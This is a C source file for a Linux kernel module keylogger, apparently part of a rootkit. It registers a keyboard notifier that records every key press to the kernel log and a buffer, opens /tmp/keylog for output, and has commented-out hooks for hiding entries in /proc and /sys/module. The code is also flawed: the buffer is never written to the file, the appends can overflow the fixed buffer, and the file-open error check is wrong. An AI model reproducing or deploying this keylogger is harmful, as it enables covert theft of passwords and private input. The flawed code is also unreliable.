#include "keylogger.h"

extern u8 module_hidden;

static struct file *filep;

static char buffer[1024];

static int keylogger_notify(struct notifier_block *nb, unsigned long action, void *void_params) {
	struct keyboard_notifier_param *param = void_params;
	if (action == KBD_KEYCODE) {
		if (param->down) {
			pr_info("%s\n", keymap[param->value]);
			if (param->value == 28) {
				strncat(buffer, "\n", 1);
			} else {
				strncat(buffer, keymap[param->value], strlen(keymap[param->value]));
			}
		}
	}
	return NOTIFY_OK;
}

static struct notifier_block keylogger_notifier = {
	.notifier_call = keylogger_notify
};

int keylogger_init(void)
{
    pr_info("Init keylogger");

    if (!(filep = filp_open("/tmp/keylog", O_WRONLY | O_CREAT | O_APPEND, 0))) {
	    return -1;
    }
    //SET_FOP(iterate_shared, "/proc", rk_proc_iterate_shared, orig_proc_iterate_shared);
    //SET_FOP(iterate_shared, "/sys/module", rk_sys_iterate_shared, orig_sys_iterate_shared);
    
    register_keyboard_notifier(&keylogger_notifier);

    return 0;
}

int keylogger_clean(void)
{
    //UNSET_FOP(iterate_shared, "/proc", orig_proc_iterate_shared);
    //UNSET_FOP(iterate_shared, "/sys/module", orig_sys_iterate_shared);
    unregister_keyboard_notifier(&keylogger_notifier);
    filp_close(filep, NULL);
    return 0;
}
